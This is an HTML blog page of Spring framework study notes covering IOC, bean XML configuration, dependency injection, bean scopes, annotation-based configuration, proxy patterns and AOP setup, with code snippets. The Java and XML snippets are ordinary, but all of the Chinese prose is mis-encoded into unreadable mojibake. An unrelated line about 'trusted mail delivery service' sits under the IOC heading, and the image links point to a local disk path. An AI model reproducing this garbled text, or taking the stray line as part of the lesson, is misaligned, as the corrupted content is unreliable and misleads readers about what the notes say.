class="attr">name</span>=<span class="string">"objectMapper"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.json.Jackson2ObjectMapperFactoryBean"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"failOnEmptyBeans"</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span> <span class="attr">id</span>=<span class="string">"internalResourceViewResolver"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/jsp/"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".jsp"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

      
    </div>
    
  </section>
</article>

          </div>
        
      
        
          <div class="post-wrapper">
            <article class="post reveal ">
  


  <section class="meta">
    
    
    <div class="meta" id="header-meta">
      
        
  <h2 class="title">
    <a href="/2020/10/17/Springå­¦ä¹ æ€»ç»“/">
      Springå­¦ä¹ æ€»ç»“
    </a>
  </h2>


      
      <div class="new-meta-box">
        
          
        
          
            
  <div class="new-meta-item author">
    <a href="http://yoursite.com" rel="nofollow">
      
        <i class="fas fa-user" aria-hidden="true"></i>
      
      <p>John Doe</p>
    </a>
  </div>


          
        
          
            <div class="new-meta-item date">
  <a class="notlink">
    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
    <p>2020-10-17</p>
  </a>
</div>

          
        
          
            

          
        
          
            

          
        
          
            

          
        
      </div>
      
        <hr>
      
    </div>
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
      <h1 id="Springè¯¾å ‚è®°å½•"><a href="#Springè¯¾å ‚è®°å½•" class="headerlink" title="Springè¯¾å ‚è®°å½•"></a>Springè¯¾å ‚è®°å½•</h1><h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><h2 id="IOCç†è®ºæ¨å¯¼"><a href="#IOCç†è®ºæ¨å¯¼" class="headerlink" title="IOCç†è®ºæ¨å¯¼"></a>IOCç†è®ºæ¨å¯¼</h2><ol>
<li>UserDao</li>
<li>UserDaoImpl</li>
<li>UserService</li>
<li>UserServiceImpl</li>
</ol>
<p>åœ¨ä¹‹å‰çš„ä¸šåŠ¡ä¸­,ç”¨æˆ·çš„éœ€æ±‚å¯èƒ½ä¼šå½±å“æˆ‘ä»¬çš„æºä»£ç ,æˆ‘ä»¬è¦æ ¹æ®ç”¨æˆ·çš„éœ€æ±‚ä¿®æ”¹æºä»£ç ,å¦‚æœä»£ç é‡éå¸¸å¤§,ä¿®æ”¹ä¸€æ¬¡çš„æˆæœ¬ååˆ†æ˜‚è´µ!</p>
<p>ä½¿ç”¨ä¸€ä¸ªSetæ¥å£,åˆ©ç”¨setè¿›è¡ŒåŠ¨æ€å€¼çš„æ³¨å…¥,ä¼šå‘ç”Ÿé©å‘½æ€§çš„å˜åŒ–!</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHello</span><span class="params">(Hello hello)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.hello = hello;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ä¹‹å‰,æ˜¯ç¨‹åºä¸»åŠ¨åˆ›é€ å¯¹è±¡!æ§åˆ¶æƒåœ¨ç¨‹åºå‘˜æ‰‹ä¸Š!</li>
<li>ä½¿ç”¨setæ³¨å…¥å,ç¨‹åºä¸åœ¨å…·æœ‰ä¸»åŠ¨æ€§,è€Œæ˜¯å˜æˆäº†è¢«åŠ¨çš„æ¥å—å¯¹è±¡!</li>
</ul>
<p>è¿™ç§æ€æƒ³,ä»æœ¬è´¨ä¸Šè§£å†³äº†é—®é¢˜,ç¨‹åºå‘˜ä¸ç”¨å†å»ç®¡ç†å¯¹è±¡çš„åˆ›å»º.ç³»ç»Ÿçš„è€¦åˆæ€§å¤§å¤§é™ä½,å¯ä»¥ä½¿ç¨‹åºçŒ¿æ›´åŠ ä¸“æ³¨åœ¨ä¸šåŠ¡çš„å®ç°ä¸Š!è¿™æ˜¯IOCçš„åŸå‹!</p>
<h2 id="IOCå®ç°"><a href="#IOCå®ç°" class="headerlink" title="IOCå®ç°"></a>IOCå®ç°</h2><ul>
<li>An architecture for end-to-end and inter-domain trusted mail delivery service</li>
</ul>
<h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><ol>
<li><p>åœ¨beans.xml ä¸­é…ç½®æ³¨å†Œpojoç±»,å°†è¿™äº›ç±»äº¤ç»™springè¿›è¡Œç®¡ç†</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- more bean definitions go here --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>ä½¿ç”¨beans</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create and configure beans</span></span><br><span class="line">ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"services.xml"</span>, <span class="string">"daos.xml"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// retrieve configured instance</span></span><br><span class="line">PetStoreService service = context.getBean(<span class="string">"petStore"</span>, PetStoreService.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// use configured instance</span></span><br><span class="line">List&lt;String&gt; userList = service.getUsernameList();</span><br></pre></td></tr></table></figure>
</li>
<li><p>beanä¸­çš„å‚æ•°</p>
<ol>
<li><strong>id</strong>:beançš„å”¯ä¸€æ ‡è¯†</li>
<li><strong>class</strong>:beanç»‘å®šçš„pojoå¯¹è±¡</li>
<li><strong>autowire</strong>:é€šè¿‡setæ–¹æ³•ä¸­çš„å±æ€§è‡ªåŠ¨è£…é…å…¶ä»–çš„bean</li>
</ol>
</li>
</ol>
<h3 id="ä¾èµ–æ³¨å…¥"><a href="#ä¾èµ–æ³¨å…¥" class="headerlink" title="ä¾èµ–æ³¨å…¥"></a>ä¾èµ–æ³¨å…¥</h3><ul>
<li><a href="https://docs.spring.io/spring-framework/docs/current/spring-framework-reference/core.html#beans-constructor-injection" target="_blank" rel="noopener">æ„é€ å™¨æ³¨å…¥</a></li>
<li>setæ³¨å…¥<ul>
<li>ä¾èµ–:beanå¯¹è±¡çš„åˆ›å»ºä¾èµ–ä¸å®¹å™¨!</li>
<li>æ³¨å…¥:beanå¯¹è±¡çš„æ‰€æœ‰å±æ€§æœ‰å®¹å™¨æ³¨å…¥!</li>
</ul>
</li>
<li><a href="https://docs.spring.io/spring-framework/docs/current/spring-framework-reference/core.html#beans-factory-properties-detailed" target="_blank" rel="noopener">æ‹“å±•æ–¹å¼æ³¨å…¥</a> </li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"exampleBean"</span> <span class="attr">class</span>=<span class="string">"examples.ExampleBean"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- constructor injection using the nested ref element --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">"anotherExampleBean"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- constructor injection using the neater ref attribute --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span>=<span class="string">"yetAnotherBean"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">"int"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"anotherExampleBean"</span> <span class="attr">class</span>=<span class="string">"examples.AnotherBean"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"yetAnotherBean"</span> <span class="attr">class</span>=<span class="string">"examples.YetAnotherBean"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="beançš„ä½œç”¨åŸŸ"><a href="#beançš„ä½œç”¨åŸŸ" class="headerlink" title="beançš„ä½œç”¨åŸŸ"></a><a href="https://docs.spring.io/spring-framework/docs/current/spring-framework-reference/core.html#beans-factory-scopes" target="_blank" rel="noopener">beançš„ä½œç”¨åŸŸ</a></h3><ul>
<li><p>==å•ä¾‹æ¨¡å¼==(springé»˜è®¤æœºåˆ¶) :è¿™å…¨å±€å”¯ä¸€,æ°¸è¿œåªåˆ›å»ºä¸€ä¸ªå®ä¾‹</p>
<p><img src="/Users/xuehuzhou/Library/Application Support/typora-user-images/image-20200924191429236.png" alt="image-20200924191429236"></p>
</li>
</ul>
  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"accountService"</span> <span class="attr">class</span>=<span class="string">"com.something.DefaultAccountService"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- the following is equivalent, though redundant (singleton scope is the default) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"accountService"</span> <span class="attr">class</span>=<span class="string">"com.something.DefaultAccountService"</span> <span class="attr">scope</span>=<span class="string">"singleton"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>åŸå‹æ¨¡å¼:æ¯æ¬¡éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„å¯¹è±¡</p>
<p><img src="/Users/xuehuzhou/Library/Application Support/typora-user-images/image-20200924204552279.png" alt="image-20200924204552279"></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"accountService"</span> <span class="attr">class</span>=<span class="string">"com.something.DefaultAccountService"</span> <span class="attr">scope</span>=<span class="string">"prototype"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>#### </p>
</li>
</ul>
<h2 id="Springæ³¨è§£å¼€å‘"><a href="#Springæ³¨è§£å¼€å‘" class="headerlink" title="Springæ³¨è§£å¼€å‘"></a>Springæ³¨è§£å¼€å‘</h2><h3 id="applicationContext-xmlé…ç½®æ–‡ä»¶"><a href="#applicationContext-xmlé…ç½®æ–‡ä»¶" class="headerlink" title="applicationContext.xmlé…ç½®æ–‡ä»¶"></a>applicationContext.xmlé…ç½®æ–‡ä»¶</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/context/spring-context.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.huzai.pojo"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="beançš„æ³¨å…¥åŒ…æ‹¬"><a href="#beançš„æ³¨å…¥åŒ…æ‹¬" class="headerlink" title="beançš„æ³¨å…¥åŒ…æ‹¬"></a>beançš„æ³¨å…¥åŒ…æ‹¬</h3><ul>
<li>åœ¨<strong>pojo</strong>ä¸­ç›´æ¥ç”¨<strong>[@Component]</strong></li>
<li>åœ¨<strong>service</strong>ä¸­ä½¿ç”¨<strong>[@Service]</strong></li>
<li>åœ¨<strong>dao</strong>ä½¿ç”¨<strong>[@Repository]</strong></li>
<li>åœ¨<strong>controller</strong>ä½¿ç”¨<strong>[@Controller]</strong></li>
</ul>
<h3 id="å€¼ä¸å¯¹è±¡çš„æ³¨å…¥"><a href="#å€¼ä¸å¯¹è±¡çš„æ³¨å…¥" class="headerlink" title="å€¼ä¸å¯¹è±¡çš„æ³¨å…¥"></a>å€¼ä¸å¯¹è±¡çš„æ³¨å…¥</h3><ul>
<li><p>[@Value(â€œhuzaiâ€)]å¯¹å€¼çš„æ³¨å…¥</p>
</li>
<li><p>[@Scope(â€œprotoTypeâ€)]ä½œç”¨åŸŸçš„æ³¨å…¥</p>
</li>
<li><p>[@Autowired] å¯¹å¯¹è±¡ä¸­çš„å¯¹è±¡çš„æ³¨å…¥</p>
</li>
<li><p>[@Qualifier(value = â€œdogâ€)] é…åˆ@Autowiredä½¿ç”¨,æŒ‡å®šç²¾ç¡®çš„æ³¨å…¥å¯¹è±¡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value</span>(<span class="string">"huzai"</span>)</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="meta">@Qualifier</span>(value = <span class="string">"dog"</span>)</span><br><span class="line"><span class="keyword">private</span> Dog dog;</span><br></pre></td></tr></table></figure>
</li>
<li><p>[@Nullable]è¡¨æ˜å­—æ®µå¯ä»¥ä¸ºç©º</p>
</li>
</ul>
<h3 id="å®Œå…¨ä¸ç”¨xmlé…ç½®çš„æ³¨è§£å¼€å‘"><a href="#å®Œå…¨ä¸ç”¨xmlé…ç½®çš„æ³¨è§£å¼€å‘" class="headerlink" title="å®Œå…¨ä¸ç”¨xmlé…ç½®çš„æ³¨è§£å¼€å‘"></a>å®Œå…¨ä¸ç”¨xmlé…ç½®çš„æ³¨è§£å¼€å‘</h3><ul>
<li>é…ç½®ç”¨config.java(ç›¸å½“äºbeans.xml)</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyConfig</span> </span>&#123;</span><br><span class="line">    <span class="comment">//æ³¨å†Œä¸€ä¸ªbean,ç›¸å½“äºä¸€ä¸ªbeançš„æ ‡ç­¾</span></span><br><span class="line">  	<span class="comment">//æ–¹æ³•çš„åå­—ç›¸å½“äºbeanæ ‡ç­¾ä¸­çš„idå±æ€§</span></span><br><span class="line">  	<span class="comment">//æ–¹æ³•çš„è¿”å›å€¼ç›¸å½“äºbeanæ ‡ç­¾ä¸­çš„classå±æ€§</span></span><br><span class="line">  	<span class="comment">//</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ä»£ç†æ¨¡å¼"><a href="#ä»£ç†æ¨¡å¼" class="headerlink" title="ä»£ç†æ¨¡å¼"></a>ä»£ç†æ¨¡å¼</h2><h3 id="é™æ€ä»£ç†"><a href="#é™æ€ä»£ç†" class="headerlink" title="é™æ€ä»£ç†"></a>é™æ€ä»£ç†</h3><p>é™æ€ä»£ç†ä¹Ÿå°±æ˜¯é¡¹ç›®æ¨ªå‘å¼€å‘çš„è¿‡ç¨‹,åœ¨æ­¤è¿‡ç¨‹ä¸­,çŒ¿ä»¬æ— éœ€æ”¹å˜ä»¥å‰çš„ä»£ç ,å› ä¸ºè¿™æ˜¯å…¬å¸ä¸­çš„å¤§å¿Œ.</p>
<h4 id="è§’è‰²åˆ†æ"><a href="#è§’è‰²åˆ†æ" class="headerlink" title="è§’è‰²åˆ†æ"></a>è§’è‰²åˆ†æ</h4><ul>
<li>æŠ½è±¡è§’è‰²:ä¸€èˆ¬ä½¿ç”¨æ¥å£æˆ–æŠ½è±¡ç±»æ¥è§£å†³</li>
<li>çœŸå®è§’è‰²:è¢«ä»£ç†çš„è§’è‰²</li>
<li>ä»£ç†è§’è‰²:ä»£ç†çœŸå®è§’è‰²,ä¸€èˆ¬æœ‰ä¸€äº›é™„å±æ“ä½œ</li>
<li>å®¢æˆ·:è®¿é—®ä»£ç†å¯¹è±¡çš„äºº</li>
</ul>
<h4 id="ä»£ç æ­¥éª¤"><a href="#ä»£ç æ­¥éª¤" class="headerlink" title="ä»£ç æ­¥éª¤"></a>ä»£ç æ­¥éª¤</h4><ol>
<li><p>æ¥å£</p>
</li>
<li><p>çœŸå®è§’è‰²</p>
</li>
<li><p>ä»£ç†è§’è‰²</p>
</li>
<li><p>å®¢æˆ·ç«¯è®¿é—®</p>
</li>
</ol>
<h4 id="ä»£ç†æ¨¡å¼çš„å¥½å¤„"><a href="#ä»£ç†æ¨¡å¼çš„å¥½å¤„" class="headerlink" title="ä»£ç†æ¨¡å¼çš„å¥½å¤„"></a>ä»£ç†æ¨¡å¼çš„å¥½å¤„</h4><ul>
<li>å¯ä»¥æ˜¯çœŸå®è§’è‰²çš„æ“ä½œæ›´åŠ çº¯ç²¹,ä¸ç”¨å…³å¿ƒå…¶ä»–å…¬å…±ä¸šåŠ¡</li>
<li>å…¬å…±ä¸šåŠ¡å¯ä»¥äº¤ç»™ä»£ç†è§’è‰²!å®ç°äº†ä¸šåŠ¡çš„åˆ†å·¥!</li>
<li>å…¬å…±ä¸šåŠ¡å‘ç”Ÿé›†ä¸­åœ¨ä¸€èµ·,æ–¹ä¾¿ç®¡ç†</li>
</ul>
<h4 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h4><ul>
<li>ä¸€ä¸ªçœŸå®è§’è‰²äº§ç”Ÿä¸€ä¸ªä»£ç†,ä»£ç é‡ç¿»å€,å¼€å‘æ•ˆç‡å˜ä½</li>
</ul>
<h2 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h2><ul>
<li>è§’è‰²ä¸é™æ€ä»£ç†ä¸€æ ·</li>
<li>ä»£ç†åŠ¨æ€ç”Ÿæˆ</li>
<li>åˆ†ä¸ºä¸¤å¤§ç±»<ul>
<li>åŸºäºæ¥å£ â€“ JDKâ€™åŠ¨æ€ä»£ç†</li>
<li>åŸºäºç±» â€“ cglib</li>
<li>åŸºäºjavaå­—èŠ‚ç  â€“ javassit</li>
</ul>
</li>
<li>ä¼˜ç‚¹<ul>
<li>é™¤äº†é™æ€ä»£ç†çš„</li>
<li>ä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»å¯ä»¥ä»£ç†å¤šä¸ªç±»,åªè¦å®ç°äº†å¯¹åº”çš„å€Ÿå£</li>
<li>ä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»ä»£ç†çš„æ˜¯ä¸€ä¸ªæ¥å€Ÿå£,ä¸€èˆ¬å¯¹åº”çš„æ˜¯ä¸€ç±»ä¸šåŠ¡</li>
</ul>
</li>
</ul>
<h2 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h2><h3 id="åœ¨Springä¸­çš„ä½œç”¨"><a href="#åœ¨Springä¸­çš„ä½œç”¨" class="headerlink" title="åœ¨Springä¸­çš„ä½œç”¨"></a>åœ¨Springä¸­çš„ä½œç”¨</h3><p>==æä¾›å£°æ˜å¼äº‹ç‰©;å…è®¸ç”¨æˆ·è‡ªå®šä¹‰åˆ‡é¢==</p>
<h3 id="Springä¸­å®ç°AOP"><a href="#Springä¸­å®ç°AOP" class="headerlink" title="Springä¸­å®ç°AOP"></a>Springä¸­å®ç°AOP</h3><ul>
<li><p>AOPä¾èµ–</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>é…ç½®æ–‡ä»¶:applicationContext.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">"http://www.springframework.org/schema/aop"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/aop</span></span></span><br><span class="line"><span class="tag"><span class="string">         https://www.springframework.org/schema/aop/spring-aop.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.huzai"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>æ–¹å¼</p>
<ul>
<li><p>æ–¹å¼ä¸€:ä½¿ç”¨Spring APIæ¥å£</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">"pointcut"</span> <span class="attr">expression</span>=<span class="string">"execution(* 		com.huzai.service.UserServiceImpl.*(..))"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">"log"</span> <span class="attr">pointcut-ref</span>=<span class="string">"pointcut"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>æ–¹å¼äºŒ:è‡ªå®šä¹‰ç±»</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--    æ–¹å¼äºŒï¼šä½¿ç”¨è‡ªå®šä¹‰ç±»--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">"diyPointCut"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">"pointcut"</span> <span class="attr">expression</span>=<span class="string">"execution(* com.huzai.service.*.*(..))"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">method</span>=<span class="string">"before"</span> <span class="attr">pointcut-ref</span>=<span class="string">"pointcut"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
